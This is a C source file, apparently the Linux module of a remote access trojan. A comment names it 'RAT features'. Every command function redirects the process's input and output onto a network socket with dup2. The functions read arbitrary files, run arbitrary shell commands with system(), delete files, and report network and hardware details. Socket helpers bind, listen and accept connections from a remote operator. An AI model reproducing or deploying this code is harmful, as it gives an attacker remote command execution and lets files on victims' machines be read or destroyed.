/* Dependencies */

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>

/* Header file with function prototypes */

#include "interface.h"

/* Platform dependent RAT features */

void read_file(int sockfd, const char *filepath)
{
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    FILE *fp;
    char *line = NULL;

    size_t len = 0;
    ssize_t read;

    fp = fopen(filepath, "r");

    if (fp == NULL)
    {
        printf("[!] Unable to open file\n");
	exit(1);
    }

    while ((read = getline(&line, &len, fp)) != -1)
    {
        printf("%s", line);
    }

    fclose(fp);
}

void system_info(int sockfd)
{
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    system("ifconfig ; lscpu");
}

void run_command(int sockfd, const char *argument)
{
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    system(argument);
}

void delete_file(int sockfd, const char *filename)
{
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    if (remove(filename) == 0)
    {
        printf("[+] File deleted successfully\n");
    }

    else 
    {
        printf("[!] Error deleting file\n");
    }
}

void networking_info(int sockfd)
{
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    system("netstat --listen");
}

/* Abstract function to create a socket */
Hndl create_socket(const char *host, int port)
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    return sockfd;
}

/* Abstract function to bind socket */
Hndl bind_socket(int port, int sockfd)
{
    struct sockaddr_in address;
    
    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    address.sin_addr.s_addr = INADDR_ANY;

    int result = bind(sockfd, (struct sockaddr *)&address, sizeof(address));

    return result;
}

/* Abstract function to listen on socket */
Hndl listen_socket(int max_connections, int sockfd)
{
    int result = listen(sockfd, max_connections);

    return result;
}

/* Abstract function to accept an incoming connection from client */
Hndl accept_socket(int sockfd, int port)
{
    struct sockaddr_in address;

    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    address.sin_addr.s_addr = INADDR_ANY;

    int addrlen = sizeof(address);
    int new_socket = accept(sockfd, (struct sockaddr *)&address, (socklen_t*)&addrlen);

    return new_socket;
}

/* Abstract function to read from a socket connection */
Hndl read_socket(int sockfd, char buffer[], int len)
{
    int valread = read(sockfd, buffer, len);

    return valread;
}
